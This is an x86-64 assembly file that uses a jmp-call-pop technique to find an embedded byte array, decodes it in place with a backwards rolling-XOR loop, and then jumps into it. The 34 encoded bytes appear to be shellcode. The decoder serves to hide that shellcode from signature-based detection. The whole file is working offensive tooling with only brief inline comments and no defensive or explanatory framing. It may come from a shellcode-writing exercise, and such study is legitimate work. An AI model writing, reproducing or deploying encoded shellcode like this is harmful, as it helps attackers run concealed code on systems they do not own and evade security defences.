global _start

section .text
_start:
    jmp short get_address       ; jmp-call-pop for shellcode address

decoder:
    pop rdi                     ; address to encoded_shellcode
    push 34
    pop rcx                     ; rolling-xor requires one less xor instruction
    xor eax, eax                ; than the length of the shellcode

decode:
    mov eax, [rdi + rcx - 1]    ; first byte in xor (earlier of the two)
    xor byte [rdi + rcx], al    ; xor the byte above with the one that directly follows
    loop decode                 ; the decoder works backwards

jmp short encoded_shellcode     ; do the thing

get_address:
    call decoder
    encoded_shellcode: db 0x68,0xe,0x62,0x3,0x64,0xe,0xc,0x54,0x1c,0x95,0x72,0x43,0xb5,0x2c,0x23,0x26,0x67,0xdd,0x22,0xdd,0x22,0x5d,0x15,0x9c,0x5a,0x30,0x18,0x40,0x2a,0x2b,0x74,0xed,0xe2,0xe7
